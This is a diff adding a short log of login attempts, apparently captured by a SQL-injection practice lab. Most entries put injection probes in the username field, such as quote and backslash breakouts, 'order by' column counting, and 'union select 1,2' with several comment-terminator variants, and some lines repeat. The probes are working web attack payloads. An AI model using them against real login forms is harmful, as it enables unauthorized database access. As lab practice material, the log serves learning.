@@ -1,0 +1,51 @@
+User Name:、Password:
+User Name:\Password:
+User Name:')  union select 1,2  #Password:
+User Name:' union select 1,2  #Password:
+User Name:' order by 1 --+Password:
+User Name:')  union select 1,2  -- Password:
+User Name:')  union select 1,2  --+Password:
+User Name:')  union select 1,2  --\ Password:
+User Name:')  union select 1,2  --%a0Password:
+User Name:')  union select 1,2  --%a0Password:
+User Name:')  union select 1,2  --%a0Password:
+User Name:')  union select 1,2  --%a0Password:
+User Name:')  union select 1,2  --%a0Password:
+User Name:')  union select 1,2  --%a0Password:
+User Name:')  union select 1,2  --%a0Password:
+User Name:\Password:
+User Name:\Password:
+User Name:\Password:
+User Name:Password:
+User Name:Password:
+User Name:\Password:
+User Name:')  union select 1,2  -- Password:fasf
+User Name:')  union select 1,2  -- Password:
+User Name:')  union select 1,2  --Password:fasdf
+User Name:')  union select 1,2  --Password:fasdf
+User Name:' union selece 1,2 #Password:
+User Name:' union select 1,2  --Password:
+User Name:' union select 1,2  --Password:122
+User Name:Password:
+User Name:' union select 1,2  --Password:122
+User Name:' union select 1,2  --     Password:12
+User Name:' union select 1,2  --+Password:1221
+User Name:'  union select 1,2  --     Password:
+User Name:'  union select 1,2  --     Password:
+User Name:'  union select 1,2  --     Password:
+User Name:'  union select 1,2  --     Password:
+User Name:'  union select 1,2  --     Password:
+User Name:'  union select 1,2  --     Password:
+User Name:Password:
+User Name:Password:
+User Name:' union select 1,2  --  Password:
+User Name:\Password:
+User Name:1' -- Password:
+User Name:1' -- Password:
+User Name:\Password:
+User Name:1' --Password:
+User Name:1'   --   Password:
+User Name:1' order by 1 #Password:
+User Name:' order by 1 #Password:
+User Name:' order by 3#Password:
+User Name:' union select 1,2 -- Password:
